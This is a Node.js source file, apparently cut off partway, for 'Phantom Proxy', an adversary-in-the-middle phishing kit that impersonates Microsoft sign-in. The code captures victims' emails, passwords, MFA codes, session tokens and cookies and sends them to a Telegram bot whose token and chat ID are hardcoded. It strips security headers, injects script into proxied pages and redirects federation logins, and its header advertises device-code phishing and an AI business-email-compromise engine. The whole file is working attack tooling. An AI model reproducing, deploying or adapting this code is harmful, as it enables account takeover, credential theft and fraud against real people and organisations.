// ============================================================
// 🥔 PHANTOM PROXY v8.2 — COMPLETE AiTM + DASHBOARD ULTIMATE
// ============================================================
// 🔥 COMBINES:
//   ✅ Advanced AiTM proxy (redirect interception, session tracking, cookies, HTML injection, FederationRedirectUrl)
//   ✅ Phantom Dashboard (Express + basic auth)
//   ✅ Telegram Exfil (tokens, cookies, creds as .txt files)
//   ✅ PRT Engine (scan, health, exchange)
//   ✅ Graph API (email, contacts, calendar)
//   ✅ Device Code Phishing (OAuth 2.0 device flow)
//   ✅ AI BEC Engine (Groq API)
//   ✅ Token Vault & Health-Check
//   ✅ Auto-Refresh Daemons (30 min)
//   ✅ esctx/sccauth → JWT Conversion
// ============================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");
const { spawn, exec } = require("child_process");

// ── ✅ SAFE REQUIRE WITH FALLBACKS ──
let axios, express, basicAuth, AdmZip, WebSocket, FormData, SocksProxyAgent, obfuscator, rateLimit;

try { axios = require('axios'); } catch (e) { axios = null; }
try { express = require('express'); } catch (e) { express = null; }
try { basicAuth = require('express-basic-auth'); } catch (e) { basicAuth = null; }
try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
try { FormData = require('form-data'); } catch (e) { FormData = null; }
try { SocksProxyAgent = require('socks-proxy-agent'); } catch (e) { SocksProxyAgent = null; }
try { obfuscator = require('javascript-obfuscator'); } catch (e) { obfuscator = null; }
try { rateLimit = require('express-rate-limit'); } catch (e) { rateLimit = null; }

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
const CHAT_ID = '7310383191';

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://login.microsoftonline.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");
const TELEGRAM_QUEUE_FILE = path.join(__dirname, "telegram_queue.json");

if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });

const fsPromises = fs.promises;
const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};
let telegramQueue = [];
let deviceFlows = [];
let prtStorage = { prts: [], lastScan: null };

// ── ✅ CACHE MANAGER ──
class CacheManager {
    constructor(ttl = 300000) {
        this.cache = new Map();
        this.ttl = ttl;
        this.hits = 0;
        this.misses = 0;
    }

    get(key) {
        const item = this.cache.get(key);
        if (!item) { this.misses++; return null; }
        if (Date.now() > item.expiry) { this.cache.delete(key); this.misses++; return null; }
        this.hits++; return item.value;
    }

    set(key, value, ttl = null) {
        const expiry = Date.now() + (ttl || this.ttl);
        this.cache.set(key, { value, expiry });
        return value;
    }

    getStats() {
        const total = this.hits + this.misses;
        return { size: this.cache.size, hits: this.hits, misses: this.misses, hitRate: total > 0 ? (this.hits / total * 100).toFixed(1) + '%' : '0%' };
    }

    clean() {
        const now = Date.now();
        for (const [key, item] of this.cache) {
            if (now > item.expiry) this.cache.delete(key);
        }
    }
}

global._cache = new CacheManager(300000);

// ── ✅ RETRY LOGIC ──
async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
    let lastError;
    let currentDelay = delay;
    for (let attempt = 1; attempt <= retries; attempt++) {
        try { return await fn(); } catch (error) {
            lastError = error;
            if (attempt === retries) break;
            const jitter = Math.random() * 0.3 + 0.85;
            await new Promise(resolve => setTimeout(resolve, currentDelay * jitter));
            currentDelay *= backoff;
        }
    }
    throw lastError;
}

// ── ✅ USER-AGENT ROTATION ──
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }

function getAxiosConfig() {
    return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } };
}

// ============================================================
// 📤 TELEGRAM EXFILTRATION
// ============================================================
async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
    if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# ============================================================\n';
        content += '# 🔑 FULL TOKENS DUMP\n';
        content += '# ============================================================\n';
        content += `# Session ID: ${sessionId}\n`;
        content += `# Captured: ${new Date().toISOString()}\n`;
        content += `# Email: ${email || 'N/A'}\n`;
        content += `# Password: ${password || 'N/A'}\n`;
        content += `# MFA Code: ${mfaCode || 'N/A'}\n`;
        content += '# ============================================================\n\n';
        for (const [key, val] of Object.entries(tokens)) {
            if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
        }
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🔑 Tokens file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
    } catch (e) { console.error('Telegram tokens file failed:', e.message); }
}

async function sendCookiesFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `cookies_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🍪 COOKIES DUMP\n';
        for (const [name, value] of Object.entries(cookies)) content += `${name}=${value}\n`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🍪 Cookies: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
    } catch (e) { console.error('Telegram cookies file failed:', e.message); }
}

async function sendToTelegram(data) {
    if (!axios) return;
    try {
        const sessionId = data.sessionId || 'unknown';
        const ip = data.ip || 'Unknown';
        const email = data.email || 'N/A';
        const password = data.password || 'N/A';
        const mfa = data.mfa || 'N/A';
        const tokens = data.tokens || {};
        const cookies = data.cookies || {};

        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 **Email:** ${email}\n🔐 **Password:** ${password}\n📱 **MFA:** ${mfa}\n🌍 **IP:** ${ip}\n🆔 **Session:** ${sessionId}\n🕒 **Time:** ${new Date().toISOString()}\n\n📎 **Attachments:**\n`;
        if (Object.keys(tokens).length > 0) {
            message += '🔑 Tokens file attached.\n';
            await sendTokensFile(tokens, sessionId, email, password, mfa);
        }
        if (Object.keys(cookies).length > 0) {
            message += '🍪 Cookies file attached.\n';
            await sendCookiesFile(cookies, sessionId);
        }
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, { timeout: 5000 });
        console.log(`✅ Telegram exfil for session ${sessionId}`);
    } catch (e) {
        console.error('Telegram send failed:', e.message);
    }
}

// ============================================================
// 🧩 ORIGINAL AiTM PROXY HELPERS
// ============================================================
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [name, ...val] = cookie.split("=");
        if (VICTIM_SESSIONS.hasOwnProperty(name) && VICTIM_SESSIONS[name].value === val.join("=")) return name;
    }
    return;
}

function generateRandomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);
    for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
    console.error("******************************");
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);
    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];
        cipher
            .on("error", reject)
            .on("data", chunk => encryptedData.push(chunk))
            .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const transaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];
    const encrypted = await encryptData(JSON.stringify(transaction));
    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

// ── Cookie management ──
function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
    if (sCookie.length < 2) return false;
    if (cookieHostOnly && sReq.length !== sCookie.length) return false;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1, l = sCookie.length + 1; i < l; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const sReq = requestPath.split("/"), sCookie = cookiePath.split("/");
    if (cookiePath === "/") return true;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1, l = sCookie.length; i < l; i++) if (sCookie[i] !== sReq[i]) return false;
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
           isPathApplicable(requestOptions.path, cookie.path);
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const cookieMap = {};
    const now = Date.now();
    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(now > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            cookieMap[cookie.name] = cookie.value;
        }
    }
    return Object.entries(cookieMap).map(([n, v]) => `${n}=${v}`).join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
    let h, m, s, day, month, year;
    const tokens = cookieDate.split(/[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/).filter(t => t);
    for (const token of tokens) {
        if (!foundTime) {
            const tm = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
            if (tm) { foundTime = true; h = parseInt(tm[1]); m = parseInt(tm[2]); s = parseInt(tm[3]); continue; }
        }
        if (!foundDay) {
            const dm = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
            if (dm) { foundDay = true; day = parseInt(dm[1]); continue; }
        }
        if (!foundMonth) {
            const months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
            for (let i = 0; i < months.length; i++) {
                if (token.toLowerCase().startsWith(months[i])) { foundMonth = true; month = i; break; }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const ym = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
            if (ym) { foundYear = true; year = parseInt(ym[1]); continue; }
        }
    }
    if (year >= 70 && year <= 99) year += 1900; else if (year >= 0 && year <= 69) year += 2000;
    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
    if (day < 1 || day > 31 || year < 1601 || h > 23 || m > 59 || s > 59) return NaN;
    const d = new Date(Date.UTC(year, month, day, h, m, s));
    if (d.getUTCFullYear() !== year || d.getUTCMonth() !== month || d.getUTCDate() !== day) return NaN;
    return d.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const now = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) clockSkew = now - parseCookieDate(proxyResponseDate);
    for (const newCookie of newCookies) {
        const [cookie, ...attrs] = newCookie.split(";");
        const [cookieName, ...cookieVal] = cookie.split("=");
        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isValid = true;
        for (const attr of attrs) {
            const a = attr.trim();
            const dm = a.match(/^domain\s*=(.*)$/i);
            const pm = a.match(/^path\s*=(.*)$/i);
            const em = a.match(/^expires\s*=(.*)$/i);
            const mm = a.match(/^max-age\s*=(.*)$/i);
            if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch ?? ["/"])[0]; }
            else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
            else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
            else if (dm) {
                cookieDomain = dm[1].replace(/^\./, "").trim(); cookieHostOnly = true; isValid = true;
                if (!cookieDomain) cookieDomain = request.hostname;
                else if (cookieDomain === proxyHostname) { cookieDomain = request.hostname; cookieHostOnly = false; }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    } else if (!isDomainApplicable(request.hostname, cookieDomain, false)) { isValid = false; continue; }
                    cookieHostOnly = false;
                }
            } else if (pm) {
                cookiePath = pm[1].trim();
                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch ?? ["/"])[0];
            } else if (em) {
                cookieExpires = parseCookieDate(em[1].trim());
            } else if (mm) {
                cookieMaxAge = mm[1].trim();
                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
            }
        }
        if (!isValid) continue;
        cookieExpires += clockSkew;
        if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
        let isNew = true;
        const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
        for (let i = 0; i < sessionCookies.length; i++) {
            const sc = sessionCookies[i];
            if (sc.name === cookieName && sc.domain === cookieDomain && sc.path === cookiePath && sc.hostOnly === cookieHostOnly) {
                if (now > cookieExpires) { sessionCookies.splice(i, 1); break; }
                sc.value = cookieVal.join("="); sc.expires = cookieExpires; isNew = false; break;
            }
        }
        if (isNew && !(now > cookieExpires)) {
            sessionCookies.push({ name: cookieName, value: cookieVal.join("="), domain: cookieDomain, path: cookiePath, expires: cookieExpires, hostOnly: cookieHostOnly });
        }
    }
}

function getValidDomains(domains) {
    const valid = [];
    for (const domain of domains) {
        const parts = domain.split(".");
        for (let i = 2; i < parts.length + 1; i++) {
            const d = parts.slice(-i).join(".");
            if (!valid.includes(d)) valid.push(d);
        }
    }
    return valid;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHeaders = ["max-forwards","x-arr-log-id","client-ip","disguised-host","x-site-deployment-id",
        "was-default-hostname","x-forwarded-proto","x-appservice-proto","x-arr-ssl","x-forwarded-tlsversion",
        "x-forwarded-for","x-original-url","x-waws-unencoded-url","x-client-ip","x-client-port"];
    const cookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
    if (cookies) proxyRequestOptions.headers.cookie = cookies;
    else delete proxyRequestOptions.headers.cookie;
    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }
    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
        else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
        "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
        "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
    for (const h of secHeaders) delete headers[h];
}

// ── Compression / injection ──
function decompressData(data, encoding) {
    const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

function compressData(data, encoding) {
    const map = { gzip: zlib.gzip, "x-gzip": zlib.gzip, deflate: zlib.deflate, br: zlib.brotliCompress, zstd: zlib.zstdCompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

async function decompressResponseBody(data, contentEncoding) {
    if (!contentEncoding) return { decompressedResponseBody: data, encodings: [] };
    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
    let d = data;
    for (let i = encodings.length - 1; i >= 0; i--) d = await decompressData(d, encodings[i]);
    return { decompressedResponseBody: d, encodings };
}

async function compressResponseBody(data, encodings) {
    let d = data;
    for (const enc of encodings) d = await compressData(d, enc);
    return d;
}

function updateHTMLProxyResponse(body) {
    const payload = "<script src=/@></script>";
    const map = { "<head>": `<head>${payload}`, "<html>": `<html><head>${payload}</head>`, "<body>": `<head>${payload}</head><body>` };
    const limit = 200;
    for (const [key, val] of Object.entries(map)) {
        const tag = Buffer.from(key);
        const idx = body.subarray(0, limit).indexOf(tag);
        if (idx !== -1) {
            return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
        }
    }
    return Buffer.concat([Buffer.from(`<head>${payload}</head>`), body]);
}

function updateFederationRedirectUrl(body, proxyHostname) {
    const obj = JSON.parse(body.toString());
    const url = obj.Credentials.FederationRedirectUrl;
    const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
    obj.Credentials.FederationRedirectUrl = proxyUrl;
    return Buffer.from(JSON.stringify(obj));
}

// ============================================================
// 🌐 MAIN PROXY SERVER (Advanced AiTM - WORKING)
// ============================================================
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        } catch (error) {
            displayError("Entry point error", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
        return;
    }

    if (url === PROXY_PATHNAMES.serviceWorker) {
        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
        fs.createReadStream(url.slice(1)).pipe(clientResponse);
        return;
    }

    if (url === PROXY_PATHNAMES.favicon) {
        if (currentSession && VICTIM_SESSIONS[currentSession]) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
        } else {
            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
        }
        clientResponse.end();
        return;
    }

    if (url === PROXY_PATHNAMES.proxy || currentSession) {
        let clientRequestBody = [];
        clientRequest
            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
            .on("data", (chunk) => clientRequestBody.push(chunk))
            .on("end", () => {
                clientRequestBody = Buffer.concat(clientRequestBody).toString();

                if (!currentSession) {
                    if (clientRequestBody) {
                        try {
                            const parsed = JSON.parse(clientRequestBody);
                            const proxyRequestURL = new URL(parsed.url);
                            const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                            if (proxyRequestURL.hostname === headers.host &&
                                proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                VICTIM_SESSIONS[cookieName].host = phishedURL.host;
                                clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                clientResponse.end();
                            } else {
                                clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                clientResponse.end();
                            }
                        } catch (error) {
                            displayError("Anonymous request parse failed", error, clientRequestBody);
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    } else {
                        clientResponse.writeHead(301, { Location: REDIRECT_URL });
                        clientResponse.end();
                    }
                    return;
                }

                let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                const proxyRequestOptions = {
                    hostname: VICTIM_SESSIONS[currentSession].hostname,
                    port: VICTIM_SESSIONS[currentSession].port,
                    method: method,
                    path: VICTIM_SESSIONS[currentSession].path,
                    headers: { ...headers },
                    rejectUnauthorized: false
                };
                let isNavigationRequest = false;

                if (clientRequestBody) {
                    if (url === PROXY_PATHNAMES.jsCookie) {
                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
                        clientResponse.end(JSON.stringify(validDomains));
                        return;
                    } else if (url === PROXY_PATHNAMES.proxy) {
                        try {
                            const parsed = JSON.parse(clientRequestBody);
                            let proxyRequestURL = new URL(parsed.url);
                            let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                            if (proxyRequestURL.hostname === headers.host) {
                                if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                    VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                    clientResponse.end();
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                    try {
                                        const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                        proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                        proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                    } catch (error) {
                                        displayError("Mutation parse failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        return;
                                    }
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                    clientResponse.end(JSON.stringify(validDomains));
                                    return;
                                }
                            }
                            proxyRequestProtocol = proxyRequestURL.protocol;
                            proxyRequestOptions.path = proxyRequestPath;
                            proxyRequestOptions.port = proxyRequestURL.port;
                            proxyRequestOptions.method = parsed.method;
                            proxyRequestOptions.headers = { ...headers, ...parsed.headers };
                            if (proxyRequestURL.hostname !== headers.host) {
                                proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                proxyRequestOptions.headers.host = proxyRequestURL.host;
                            }
                            if (proxyRequestOptions.headers.referer) {
                                proxyRequestOptions.headers.referer = parsed.referrer;
                            }
                            isNavigationRequest = parsed.mode === "navigate";
                            clientRequestBody = parsed.body;
                        } catch (error) {
                            displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                        }
                    } else {
                        console.warn(`Non-proxied URL: ${url}`);
                    }
                } else {
                    console.warn(`No request body for URL: ${url}`);
                }

                proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                const contentLength = Buffer.byteLength(proxyRequestBody);
                if (contentLength) {
                    proxyRequestOptions.headers["content-length"] = contentLength.toString();
                } else {
                    delete proxyRequestOptions.headers["content-type"];
                    delete proxyRequestOptions.headers["content-length"];
                }

                if (isNavigationRequest) {
                    VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                    VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                    VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
